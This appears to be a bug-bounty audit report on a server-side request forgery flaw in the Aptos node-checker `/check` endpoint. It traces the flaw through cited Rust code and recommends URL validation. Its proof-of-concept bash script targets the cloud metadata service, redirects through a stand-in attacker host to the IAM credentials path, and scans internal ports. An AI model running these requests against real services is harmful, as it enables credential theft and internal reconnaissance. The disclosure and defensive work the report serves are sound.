# Audit Report

## Title
Server-Side Request Forgery (SSRF) in Node-Checker TPS Endpoint Allows Unauthorized Access to Internal Infrastructure

## Summary
The Node Health Checker's `/check` API endpoint accepts user-controlled URLs without validation, allowing attackers to perform SSRF attacks against internal services, cloud metadata endpoints, and private network resources. The vulnerability exists in the TPS checker where the target URL is repeated and used to make outbound HTTP requests without sanitization.

## Finding Description

The Node Health Checker service exposes a `/check` endpoint that accepts a `node_url` parameter from untrusted users. This URL flows through multiple components without any validation against private IP ranges, localhost addresses, or cloud metadata service endpoints.

**Attack Flow:**

1. Attacker calls the `/check` endpoint with a malicious URL: [1](#0-0) 

2. The `node_url` parameter is used directly to create a `NodeAddress` without validation: [2](#0-1) 

3. The URL is used to construct an API client: [3](#0-2) 

4. In the TPS checker, the URL is extracted and repeated `repeat_target_count` times without sanitization: [4](#0-3) 

5. The cluster creation triggers HTTP requests to the attacker-controlled URL: [5](#0-4) 

6. The HTTP client follows redirects by default (up to 10), enabling redirect-based SSRF bypass: [6](#0-5) 

**Exploitable Attack Vectors:**

1. **Direct Cloud Metadata Access**: Attacker provides `http://169.254.169.254/` (AWS), `http://metadata.google.internal/` (GCP), or `http://169.254.169.254/metadata/instance` (Azure) to steal IAM credentials and secrets

2. **Redirect-Based SSRF**: Attacker hosts a redirect server that returns 302 to internal endpoints, bypassing potential URL validation

3. **Internal Port Scanning**: Probe internal infrastructure by testing various IP:port combinations

4. **Internal API Access**: Access internal HTTP services that may respond to the `/v1/` path added by the REST client

## Impact Explanation

This qualifies as **High Severity** per the Aptos bug bounty program:

1. **Infrastructure Compromise**: Access to cloud metadata services (169.254.169.254) can leak IAM credentials, API keys, database passwords, and other secrets stored in cloud provider metadata services

2. **Lateral Movement**: Compromised credentials could provide access to other infrastructure components, including validator nodes if they share network boundaries

3. **Information Disclosure**: Error messages may leak sensitive information about internal network topology and services

4. **Service Availability**: The attack amplifies requests via `repeat_target_count`, potentially causing resource exhaustion

While this doesn't directly compromise consensus or blockchain state, it represents a significant infrastructure security risk that could lead to validator node compromise if the node-checker service is deployed in sensitive environments.

## Likelihood Explanation

**Likelihood: High**

- No authentication or authorization checks on the `/check` endpoint
- No URL validation or allowlisting mechanisms
- Attack requires only a single HTTP GET request
- No special privileges or insider access needed
- Default deployment configurations are vulnerable
- HTTP client follows redirects, enabling sophisticated bypass techniques

## Recommendation

Implement comprehensive URL validation and access controls:

1. **Add URL Validation**: Create an allowlist of permitted URL schemes, domains, and IP ranges. Explicitly block:
   - Private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - Loopback addresses (127.0.0.0/8)
   - Link-local addresses (169.254.0.0/16)
   - Cloud metadata endpoints
   - Internal DNS names

2. **Disable Redirect Following**: Configure the HTTP client to not follow redirects, or implement strict validation on redirect targets

3. **Implement Authentication**: Require API key or authentication for the `/check` endpoint

4. **Add Rate Limiting**: Prevent abuse via rate limiting per IP/user

**Example Fix (add to `ecosystem/node-checker/src/server/api.rs`):**

```rust
fn validate_url(url: &Url) -> Result<(), anyhow::Error> {
    let host = url.host_str().context("URL must have a host")?;
    
    // Block IP addresses directly
    if let Ok(ip) = host.parse::<std::net::IpAddr>() {
        if ip.is_loopback() || ip.is_private() || ip.is_link_local() {
            bail!("Private, loopback, and link-local IPs are not allowed");
        }
        // Block cloud metadata IPs
        if ip.to_string() == "169.254.169.254" {
            bail!("Cloud metadata endpoint access is not allowed");
        }
    }
    
    // Block localhost and internal hostnames
    if host == "localhost" || host.ends_with(".internal") || host.ends_with(".local") {
        bail!("Internal hostnames are not allowed");
    }
    
    Ok(())
}
```

Apply validation before creating `NodeAddress`: [2](#0-1) 

## Proof of Concept

```bash
#!/bin/bash
# SSRF PoC - Access AWS metadata service

# Step 1: Direct SSRF to cloud metadata
curl -v "http://node-checker.example.com/check?baseline_configuration_id=devnet_fullnode&node_url=http://169.254.169.254&api_port=80"
# Response will contain error messages showing connection attempts to metadata service

# Step 2: Redirect-based SSRF (setup malicious redirect server first)
# On attacker server (attacker.com), setup redirect:
# HTTP 302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/

curl -v "http://node-checker.example.com/check?baseline_configuration_id=devnet_fullnode&node_url=http://attacker.com/redirect&api_port=80"
# Client will follow redirect to metadata service

# Step 3: Internal port scanning
for port in 8080 9000 5432 6379; do
    curl -s "http://node-checker.example.com/check?baseline_configuration_id=devnet_fullnode&node_url=http://10.0.1.50&api_port=$port" | jq .
done
# Response timing and error messages reveal which ports are open
```

**Notes:**
- The vulnerability is exploitable in default configurations without authentication
- The repeated URL via `repeat_target_count` amplifies the impact
- Error messages returned to the attacker may leak sensitive infrastructure details
- The attack surface extends to all internal networks accessible from the node-checker service host

### Citations

**File:** ecosystem/node-checker/src/server/api.rs (L29-45)
```rust
    #[oai(path = "/check", method = "get")]
    async fn check(
        &self,
        /// The ID of the baseline node configuration to use for the evaluation, e.g. devnet_fullnode
        baseline_configuration_id: Query<String>,
        /// The URL of the node to check, e.g. http://44.238.19.217 or http://fullnode.mysite.com
        node_url: Query<Url>,
        /// If given, we will assume the metrics service is available at the given port.
        metrics_port: Query<Option<u16>>,
        /// If given, we will assume the API is available at the given port.
        api_port: Query<Option<u16>>,
        /// If given, we will assume that clients can communicate with your node via noise at the given port.
        noise_port: Query<Option<u16>>,
        /// A public key for the node, e.g. 0x44fd1324c66371b4788af0b901c9eb8088781acb29e6b8b9c791d5d9838fbe1f.
        /// This is only necessary for certain checkers, e.g. HandshakeChecker.
        public_key: Query<Option<String>>,
    ) -> poem::Result<Json<CheckSummary>> {
```

**File:** ecosystem/node-checker/src/server/api.rs (L81-87)
```rust
        let target_node_address = NodeAddress::new(
            node_url.0,
            api_port.0,
            metrics_port.0,
            noise_port.0,
            public_key,
        );
```

**File:** ecosystem/node-checker/src/configuration/node_address.rs (L107-115)
```rust
    pub fn get_api_client(&self, timeout: Duration) -> Result<AptosRestClient> {
        let client = reqwest::ClientBuilder::new()
            .timeout(timeout)
            .cookie_provider(self.cookie_store.clone())
            .build()
            .unwrap();

        Ok(AptosRestClient::from((client, self.get_api_url()?)))
    }
```

**File:** ecosystem/node-checker/src/checker/tps.rs (L118-131)
```rust
        let target_url = target_api_index_provider.client.build_path("/").unwrap();
        let chain_id = match target_api_index_provider.provide().await {
            Ok(response) => ChainId::new(response.chain_id),
            Err(err) => {
                return Ok(vec![Self::build_result(
                    "Failed to get chain ID of your node".to_string(),
                    0,
                    format!("There was an error querying your node's API: {:#}", err),
                )]);
            },
        };

        let cluster_config = ClusterArgs {
            targets: Some(vec![target_url; self.config.repeat_target_count]),
```

**File:** crates/transaction-emitter-lib/src/cluster.rs (L58-61)
```rust
            futures.push(async move {
                let result = instance.rest_client().get_ledger_information().await;
                (instance, result)
            });
```

**File:** crates/aptos-rest-client/src/client_builder.rs (L95-109)
```rust
    pub fn build(self) -> Client {
        let version_path_base = get_version_path_with_base(self.base_url.clone());

        Client {
            inner: self
                .reqwest_builder
                .default_headers(self.headers)
                .timeout(self.timeout)
                .cookie_store(true)
                .build()
                .unwrap(),
            base_url: self.base_url,
            version_path_base,
        }
    }
```
